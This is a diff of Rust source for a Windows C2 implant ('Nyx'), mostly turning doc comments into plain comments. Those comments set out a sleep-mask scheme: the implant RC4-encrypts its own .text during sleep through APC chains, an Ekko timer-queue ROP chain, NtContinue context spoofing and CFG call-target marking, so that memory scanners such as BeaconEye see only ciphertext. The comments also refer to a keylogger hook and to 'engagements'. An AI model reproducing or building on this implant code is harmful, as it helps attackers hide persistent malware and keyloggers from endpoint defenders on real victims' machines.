@@ -19,8 +19,8 @@
 //!   - RestoreContext: called AFTER joining the helper, once .text is decrypted
 //!     and unprotected. Restores the beacon thread to its pre-sleep register
 //!     state via NtSetContextThread.
-//! The helper thread reads the saved RSP from the shared FoliageParams to build
-//! the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
+//!     The helper thread reads the saved RSP from the shared FoliageParams to build
+//!     the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
 //!
 //! ## Gating
 //! `FOLIAGE_ENABLED` defaults ON — the full APC chain + .text RC4 masking is
@@ -29,37 +29,37 @@
 
 #![cfg(target_os = "windows")]
 
-/// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
-/// chain + .text RC4 masking is active on every sleep cycle. The operator can
-/// disarm at runtime via `set_foliage_enabled(false)` if the target requires
-/// minimal footprint. See module docs for the 7-stage APC plan.
-///
-/// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
-/// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
-/// This is for hosts where the APC-chain sleep mask is unstable in the loader
-/// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
-/// Foliage's NtSetContextThread restore mishandles, surfacing as
-/// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
-/// mask is expected to work — leave the default ON for engagements.
+// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
+// chain + .text RC4 masking is active on every sleep cycle. The operator can
+// disarm at runtime via `set_foliage_enabled(false)` if the target requires
+// minimal footprint. See module docs for the 7-stage APC plan.
+//
+// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
+// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
+// This is for hosts where the APC-chain sleep mask is unstable in the loader
+// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
+// Foliage's NtSetContextThread restore mishandles, surfacing as
+// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
+// mask is expected to work — leave the default ON for engagements.
 
-/// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
-/// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
-/// real-machine validation before it can run unsupervised. The operator opts
-/// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
-/// the target. When OFF, `execute_foliage_plan` uses the data-only floor
-/// (heap mask + indirect-syscall sleep — still meaningful, just without
-/// `.text` encryption).
-///
-/// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
-/// executable stack page, and queues it via `NtQueueApcThread` against the
-/// beacon's alertable window — encrypting `.text` for the sleep window so
-/// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
-/// `.text` before the beacon resumes.
-///
-/// Mutually exclusive with the keylog hook thread: encrypting `.text` while
-/// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
-/// `.text`). When both are on, the APC path degrades to the data-only floor
-/// for that cycle (see `execute_foliage_plan`).
+// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
+// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
+// real-machine validation before it can run unsupervised. The operator opts
+// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
+// the target. When OFF, `execute_foliage_plan` uses the data-only floor
+// (heap mask + indirect-syscall sleep — still meaningful, just without
+// `.text` encryption).
+//
+// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
+// executable stack page, and queues it via `NtQueueApcThread` against the
+// beacon's alertable window — encrypting `.text` for the sleep window so
+// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
+// `.text` before the beacon resumes.
+//
+// Mutually exclusive with the keylog hook thread: encrypting `.text` while
+// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
+// `.text`). When both are on, the APC path degrades to the data-only floor
+// for that cycle (see `execute_foliage_plan`).
 
 /// Sleep `seconds` with sleep-mask obfuscation.
 ///
@@ -172,8 +172,7 @@ pub unsafe fn own_text_region() -> Option<TextRegion> {
     let mut guard = 0u32;
     while head as *const u8 != list_start && guard < 256 {
         guard += 1;
-        let entry: *mut nyx_implant_core::resolve::ListEntry =
-            head as *mut nyx_implant_core::resolve::ListEntry;
+        let entry: *mut nyx_implant_core::resolve::ListEntry = head;
         let base = (*entry).dll_base as usize;
         let size = (*entry).size_of_image as usize;
         if base != 0 && our_addr >= base && our_addr < base + size {
@@ -217,21 +216,21 @@ pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, 
     None
 }
 
-/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
-/// Per-boot diversity from the syscall runtime's SSN table.
+// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
+// Per-boot diversity from the syscall runtime's SSN table.
 
-/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
-/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
-/// failure (never crashes — see [`execute_foliage_apc`]).
-///
-/// ## How the .text encryption is now safe (Task E)
-/// The previous floor masked only registered DATA regions (via `crate::mem`)
-/// because encrypting `.text` while executing through it is instant death (the
-/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
-/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
-/// thread's parked alertable sleep, and queues an APC into the beacon's
-/// alertable window so the beacon is driven through the masked window without
-/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
+// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
+// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
+// failure (never crashes — see [`execute_foliage_apc`]).
+//
+// ## How the .text encryption is now safe (Task E)
+// The previous floor masked only registered DATA regions (via `crate::mem`)
+// because encrypting `.text` while executing through it is instant death (the
+// RC4 loop overwrites its own instructions). Task E adds the real Foliage
+// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
+// thread's parked alertable sleep, and queues an APC into the beacon's
+// alertable window so the beacon is driven through the masked window without
+// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
 
 // ===========================================================================
 // Task E: real Foliage APC chain — helper thread masks .text around the
@@ -255,65 +254,65 @@ pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, 
 // floor), and the round-trip is byte-verified before reporting success.
 // `FOLIAGE_APC_OK` is the diagnostic a selftest reads.
 
-/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
-/// but degraded (data-only floor ran). Selftest reads this.
+// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
+// but degraded (data-only floor ran). Selftest reads this.
 
-/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
-/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
-/// Returns true on full success; on ANY failure sets status=2 and returns
-/// false so the caller degrades to the data-only floor.
-///
-/// ## FoliagePlan traversal (steps 4 + 8)
-/// This function implements GetContext (step 4) and RestoreContext (step 8) on
-/// the **beacon thread** — NOT the helper:
-///   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
-///     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
-///     beacon's original register state (including RSP). The saved CONTEXT is
-///     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
-///     building the spoofed CONTEXT for NtContinue.
-///   - **RestoreContext**: After joining the helper (`.text` is decrypted and
-///     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
-///     restore the beacon thread to its pre-sleep register state.
-///
-/// # Safety
-/// `region` must be the implant's own `.text`. Single beacon caller.
-///
-/// ## Implementation: Ekko timer-queue ROP chain (Cracked5pider)
-///
-/// This uses `CreateTimerQueueTimer` to queue a chain of `NtContinue` calls,
-/// each carrying a pre-built `CONTEXT` whose RIP points at a different Win32
-/// API. The chain runs entirely on a **timer thread** (not .text), so when
-/// `SystemFunction032` encrypts `.text`, the timer thread's code (in ntdll/
-/// kernel32) is unaffected.
-///
-/// Chain (100ms intervals):
-///   1. VirtualProtect(.text, RW)      — make .text writable
-///   2. SystemFunction032(RC4 encrypt) — encrypt .text
-///   3. WaitForSingleObject(sleep)     — sleep the window
-///   4. SystemFunction032(RC4 decrypt) — decrypt .text
-///   5. VirtualProtect(.text, RX)      — restore execute protection
-///   6. SetEvent(done)                 — signal completion
-///
-/// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).
+// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
+// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
+// Returns true on full success; on ANY failure sets status=2 and returns
+// false so the caller degrades to the data-only floor.
+//
+// ## FoliagePlan traversal (steps 4 + 8)
+// This function implements GetContext (step 4) and RestoreContext (step 8) on
+// the **beacon thread** — NOT the helper:
+//   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
+//     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
+//     beacon's original register state (including RSP). The saved CONTEXT is
+//     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
+//     building the spoofed CONTEXT for NtContinue.
+//   - **RestoreContext**: After joining the helper (`.text` is decrypted and
+//     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
+//     restore the beacon thread to its pre-sleep register state.
+//
+// # Safety
+// `region` must be the implant's own `.text`. Single beacon caller.
+//
+// ## Implementation: Ekko timer-queue ROP chain (Cracked5pider)
+//
+// This uses `CreateTimerQueueTimer` to queue a chain of `NtContinue` calls,
+// each carrying a pre-built `CONTEXT` whose RIP points at a different Win32
+// API. The chain runs entirely on a **timer thread** (not .text), so when
+// `SystemFunction032` encrypts `.text`, the timer thread's code (in ntdll/
+// kernel32) is unaffected.
+//
+// Chain (100ms intervals):
+//   1. VirtualProtect(.text, RW)      — make .text writable
+//   2. SystemFunction032(RC4 encrypt) — encrypt .text
+//   3. WaitForSingleObject(sleep)     — sleep the window
+//   4. SystemFunction032(RC4 decrypt) — decrypt .text
+//   5. VirtualProtect(.text, RX)      — restore execute protection
+//   6. SetEvent(done)                 — signal completion
+//
+// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).
 
-/// Mark `addr` as a valid CFG call target using `SetProcessValidCallTargets`
-/// (kernelbase.dll, official Win10+ API). Falls back to the NT path
-/// (NtSetInformationVirtualMemory) if kernelbase isn't resolvable.
-///
-/// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
-/// Returns true on success or if CFG is not enabled (non-fatal).
+// Mark `addr` as a valid CFG call target using `SetProcessValidCallTargets`
+// (kernelbase.dll, official Win10+ API). Falls back to the NT path
+// (NtSetInformationVirtualMemory) if kernelbase isn't resolvable.
+//
+// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
+// Returns true on success or if CFG is not enabled (non-fatal).
 
-/// RC4 shim with the calling convention the PIC thunk expects:
-///   `extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
-/// Calls the evasionsdk's mask_region (RC4 is symmetric — mask = unmask).
-/// This fn itself lives in .text, but it's called by the thunk DURING the
-/// brief window between protect(RW) and the mask — at that point .text is
-/// still cleartext (the RC4 hasn't happened yet). The danger window is only
-/// during the NtWait (when .text is ciphertext), and during that window the
-/// thunk executes from the allocated page (not .text), not this shim.
+// RC4 shim with the calling convention the PIC thunk expects:
+//   `extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
+// Calls the evasionsdk's mask_region (RC4 is symmetric — mask = unmask).
+// This fn itself lives in .text, but it's called by the thunk DURING the
+// brief window between protect(RW) and the mask — at that point .text is
+// still cleartext (the RC4 hasn't happened yet). The danger window is only
+// during the NtWait (when .text is ciphertext), and during that window the
+// thunk executes from the allocated page (not .text), not this shim.
 
-/// Pack two usize values (thunk_code_addr + params_addr) into the single
-/// `usize` parameter that `raw_create_thread` accepts.
+// Pack two usize values (thunk_code_addr + params_addr) into the single
+// `usize` parameter that `raw_create_thread` accepts.
 
 /// Bundle of raw export fn-pointers the helper thread uses (resolved once on
 /// the beacon thread, copied into the helper's param block). NONE of these go
